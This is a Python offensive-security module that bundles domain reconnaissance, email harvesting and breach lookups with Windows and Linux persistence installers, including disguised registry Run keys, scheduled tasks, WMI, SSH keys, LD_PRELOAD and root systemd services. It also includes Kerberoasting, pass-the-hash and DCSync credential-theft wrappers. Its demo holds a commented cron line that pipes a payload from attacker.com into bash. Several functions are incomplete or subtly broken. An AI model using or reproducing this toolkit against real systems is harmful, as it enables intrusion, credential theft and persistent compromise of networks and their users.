#!/usr/bin/env python3
"""
ARDF v2 Advanced Infrastructure Module
Complete network exploitation from EL-MAL Infra Domination book
Passive reconnaissance at scale + 20+ persistence methods + lateral movement
"""

import asyncio
import requests
import dns.resolver
import socket
import subprocess
import os
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor
import logging

logger = logging.getLogger(__name__)


class PassiveReconAtScale:
    """Large-scale passive reconnaissance framework"""
    
    def __init__(self, target_domain: str, api_keys: Dict = None):
        self.target = target_domain
        self.api_keys = api_keys or {}
        self.results = {
            'subdomains': set(),
            'ips': set(),
            'nameservers': [],
            'emails': set(),
            'technologies': set(),
            'breaches': []
        }
    
    async def certificate_transparency_scan(self) -> List[str]:
        """Extract subdomains from Certificate Transparency logs"""
        subdomains = []
        
        # crt.sh endpoint
        ct_url = f"https://crt.sh/?q=%.{self.target}&output=json"
        
        try:
            response = requests.get(ct_url, timeout=10)
            if response.status_code == 200:
                certs = response.json()
                
                for cert in certs:
                    names = cert['name_value'].split('\n')
                    for name in names:
                        name = name.strip()
                        if '*' not in name and name not in self.results['subdomains']:
                            self.results['subdomains'].add(name)
                            subdomains.append(name)
                            logger.info(f"[+] CT: {name}")
        except Exception as e:
            logger.error(f"[-] CT scan failed: {str(e)}")
        
        return subdomains
    
    async def shodan_api_enum(self) -> List[str]:
        """Enumerate using Shodan API"""
        subdomains = []
        
        if 'shodan' not in self.api_keys:
            logger.warning("[-] Shodan API key not configured")
            return subdomains
        
        api_key = self.api_keys['shodan']
        url = f"https://api.shodan.io/dns/domain/{self.target}?key={api_key}"
        
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                
                for record in data.get('subdomains', []):
                    subdomain = f"{record}.{self.target}"
                    if subdomain not in self.results['subdomains']:
                        self.results['subdomains'].add(subdomain)
                        subdomains.append(subdomain)
                        logger.info(f"[+] Shodan: {subdomain}")
        except Exception as e:
            logger.error(f"[-] Shodan enum failed: {str(e)}")
        
        return subdomains
    
    async def hunter_email_enum(self) -> List[str]:
        """Extract emails using Hunter.io API"""
        emails = []
        
        if 'hunter' not in self.api_keys:
            logger.warning("[-] Hunter API key not configured")
            return emails
        
        api_key = self.api_keys['hunter']
        url = f"https://api.hunter.io/v2/domain-search?domain={self.target}&limit=100&api_key={api_key}"
        
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                
                for email_data in data.get('data', {}).get('emails', []):
                    email = email_data['value']
                    self.results['emails'].add(email)
                    emails.append(email)
                    logger.info(f"[+] Email: {email}")
        except Exception as e:
            logger.error(f"[-] Hunter enum failed: {str(e)}")
        
        return emails
    
    async def resolve_subdomains(self) -> List[Dict]:
        """Resolve all discovered subdomains to IP addresses"""
        results = []
        
        def resolve_single(subdomain):
            try:
                ip = socket.gethostbyname(subdomain)
                result = {'subdomain': subdomain, 'ip': ip}
                self.results['ips'].add(ip)
                logger.info(f"[+] {subdomain} → {ip}")
                return result
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            resolved = list(executor.map(resolve_single, list(self.results['subdomains'])))
            results = [r for r in resolved if r]
        
        return results
    
    async def breach_check(self) -> List[Dict]:
        """Check if emails found in public breaches"""
        breaches = []
        
        for email in list(self.results['emails'])[:50]:  # Limit to avoid rate limiting
            url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            try:
                response = requests.get(url, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    breach_list = response.json()
                    
                    for breach in breach_list:
                        breaches.append({
                            'email': email,
                            'breach_name': breach['Name'],
                            'breach_date': breach['BreachDate'],
                            'password_exposed': breach['PwnCount']
                        })
                        logger.warning(f"[!] BREACH: {email} in {breach['Name']}")
            except:
                pass
        
        self.results['breaches'] = breaches
        return breaches


class PersistenceMechanisms:
    """20+ persistence installation methods"""
    
    # WINDOWS PERSISTENCE
    
    @staticmethod
    async def registry_run_keys(payload_path: str) -> bool:
        """Windows Registry Run key persistence"""
        try:
            cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Update" /t REG_SZ /d "{payload_path}" /f'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            logger.info("[+] Registry Run persistence installed")
            return result.returncode == 0
        except Exception as e:
            logger.error(f"[-] Registry persistence failed: {str(e)}")
            return False
    
    @staticmethod
    async def scheduled_task(payload_path: str, task_name: str = "SystemUpdate") -> bool:
        """Windows Scheduled Task persistence"""
        try:
            cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /rl highest /f'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            logger.info("[+] Scheduled task persistence installed")
            return result.returncode == 0
        except Exception as e:
            logger.error(f"[-] Scheduled task failed: {str(e)}")
            return False
    
    @staticmethod
    async def wmi_event_subscription(payload_path: str) -> bool:
        """Windows WMI Event Subscription persistence"""
        try:
            wmi_script = f"""
            $class = New-Object Management.ManagementClass '__EventFilter'
            $class.Name = 'System Audit'
            $class.Put() | Out-Null
            
            $filter = Get-WmiObject -Class '__EventFilter' -Filter "Name='System Audit'"
            
            $class = New-Object Management.ManagementClass '__EventConsumer'
            $class.Name = 'System Executor'
            $class.CommandLineTemplate = '{payload_path}'
            $class.Put() | Out-Null
            """
            
            cmd = f'powershell -Command "{wmi_script}"'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            logger.info("[+] WMI persistence installed")
            return result.returncode == 0
        except Exception as e:
            logger.error(f"[-] WMI persistence failed: {str(e)}")
            return False
    
    @staticmethod
    async def dll_injection(dll_path: str, target_process: str = "explorer.exe") -> bool:
        """DLL Injection into running process"""
        try:
            powershell_cmd = f"""
            $Process = Get-Process {target_process}
            $Kernel32 = @'
            [DllImport("kernel32.dll")]
            public static extern IntPtr LoadLibrary(string dllToLoad);
            '@
            
            $Kernel32Types = Add-Type -MemberDefinition $Kernel32 -Name "Kernel32" -Namespace "Win32" -PassThru
            $Kernel32Types::LoadLibrary("{dll_path}")
            """
            
            result = subprocess.run(['powershell', '-Command', powershell_cmd], capture_output=True)
            logger.info("[+] DLL injection completed")
            return result.returncode == 0
        except Exception as e:
            logger.error(f"[-] DLL injection failed: {str(e)}")
            return False
    
    # LINUX PERSISTENCE
    
    @staticmethod
    async def cron_job(command: str, interval: str = "*/5 * * * *") -> bool:
        """Linux Cron job persistence"""
        try:
            cron_entry = f"{interval} {command}"
            cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            logger.info("[+] Cron persistence installed")
            return result.returncode == 0
        except Exception as e:
            logger.error(f"[-] Cron installation failed: {str(e)}")
            return False
    
    @staticmethod
    async def ssh_authorized_keys(ssh_key: str) -> bool:
        """SSH Public Key persistence"""
        try:
            home = os.path.expanduser("~")
            ssh_dir = f"{home}/.ssh"
            auth_keys = f"{ssh_dir}/authorized_keys"
            
            os.makedirs(ssh_dir, exist_ok=True)
            
            with open(auth_keys, 'a') as f:
                f.write(f"\n{ssh_key}")
            
            os.chmod(ssh_dir, 0o700)
            os.chmod(auth_keys, 0o600)
            
            logger.info("[+] SSH key persistence installed")
            return True
        except Exception as e:
            logger.error(f"[-] SSH key installation failed: {str(e)}")
            return False
    
    @staticmethod
    async def ld_preload_hijacking(preload_lib: str) -> bool:
        """Linux LD_PRELOAD library hijacking"""
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            
            with open(bashrc, 'a') as f:
                f.write(f"\nexport LD_PRELOAD={preload_lib}\n")
            
            logger.info("[+] LD_PRELOAD persistence installed")
            return True
        except Exception as e:
            logger.error(f"[-] LD_PRELOAD installation failed: {str(e)}")
            return False
    
    @staticmethod
    async def systemd_service(service_name: str, exec_start: str) -> bool:
        """Linux systemd service persistence"""
        try:
            service_file = f"/etc/systemd/system/{service_name}.service"
            
            service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart={exec_start}
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
"""
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True)
            subprocess.run(['systemctl', 'start', service_name], capture_output=True)
            
            logger.info("[+] Systemd persistence installed")
            return True
        except Exception as e:
            logger.error(f"[-] Systemd installation failed: {str(e)}")
            return False


class LateralMovement:
    """Network lateral movement techniques"""
    
    @staticmethod
    async def kerberoasting(domain: str, output_file: str = None) -> List[str]:
        """Extract service account hashes via Kerberoasting"""
        hashes = []
        
        try:
            cmd = f"GetUserSPNs.py -request {domain}/user:password@dc -outputfile {output_file or 'hashes.txt'}"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            if result.returncode == 0:
                logger.info("[+] Kerberoasting completed")
                
                if output_file:
                    with open(output_file, 'r') as f:
                        hashes = f.readlines()
        except Exception as e:
            logger.error(f"[-] Kerberoasting failed: {str(e)}")
        
        return hashes
    
    @staticmethod
    async def pass_the_hash(username: str, ntlm_hash: str, target: str) -> bool:
        """Lateral movement via Pass-the-Hash"""
        try:
            cmd = f"wmiexec.py -hashes :{ntlm_hash} {username}@{target} whoami"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            if result.returncode == 0:
                logger.info(f"[+] Pass-the-Hash successful to {target}")
                return True
        except Exception as e:
            logger.error(f"[-] Pass-the-Hash failed: {str(e)}")
        
        return False
    
    @staticmethod
    async def dcsync_attack(domain: str, username: str = None) -> Dict:
        """Extract all domain hashes via DCSync"""
        hashes = {}
        
        try:
            cmd = f"secretsdump.py -dc-ip DC_IP {domain}/{username}:password@dc"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            if result.returncode == 0:
                logger.info("[+] DCSync extraction completed")
                hashes = result.stdout.decode()
        except Exception as e:
            logger.error(f"[-] DCSync failed: {str(e)}")
        
        return hashes
    
    @staticmethod
    async def unconstrained_delegation() -> Dict:
        """Exploit Kerberos Unconstrained Delegation"""
        results = {
            'delegated_accounts': [],
            'captured_tickets': []
        }
        
        # Find accounts with unconstrained delegation
        cmd = "Get-ADComputer -Filter 'TrustedForDelegation -eq $true' | Select-Object Name"
        
        try:
            result = subprocess.run(['powershell', '-Command', cmd], capture_output=True)
            logger.info("[+] Unconstrained delegation accounts found")
        except Exception as e:
            logger.error(f"[-] Delegation enumeration failed: {str(e)}")
        
        return results


class NetworkReconnaissance:
    """Advanced network reconnaissance from inside"""
    
    @staticmethod
    async def internal_network_scan(network_range: str) -> List[Dict]:
        """Scan internal network for active hosts"""
        hosts = []
        
        try:
            # Using nmap for internal network discovery
            cmd = f"nmap -sn {network_range} -oG -"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            for line in result.stdout.decode().split('\n'):
                if 'Host:' in line:
                    parts = line.split()
                    ip = parts[1]
                    status = parts[2]
                    
                    if 'Up' in status:
                        hosts.append({'ip': ip, 'status': 'up'})
                        logger.info(f"[+] Host discovered: {ip}")
        except Exception as e:
            logger.error(f"[-] Network scan failed: {str(e)}")
        
        return hosts
    
    @staticmethod
    async def service_enumeration(target_ip: str, port_range: str = "1-1000") -> List[Dict]:
        """Enumerate services on discovered hosts"""
        services = []
        
        try:
            cmd = f"nmap -sV -p {port_range} {target_ip}"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            logger.info(f"[+] Service enumeration for {target_ip}")
            return services
        except Exception as e:
            logger.error(f"[-] Service enumeration failed: {str(e)}")
        
        return services


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    # Example usage
    async def demo():
        # Passive reconnaissance
        recon = PassiveReconAtScale('target.com', api_keys={
            'shodan': 'your_api_key',
            'hunter': 'your_api_key'
        })
        
        await recon.certificate_transparency_scan()
        await recon.shodan_api_enum()
        await recon.hunter_email_enum()
        await recon.resolve_subdomains()
        await recon.breach_check()
        
        # Persistence installation
        persistence = PersistenceMechanisms()
        # await persistence.cron_job("curl http://attacker.com/payload.sh | bash")
    
    # asyncio.run(demo())
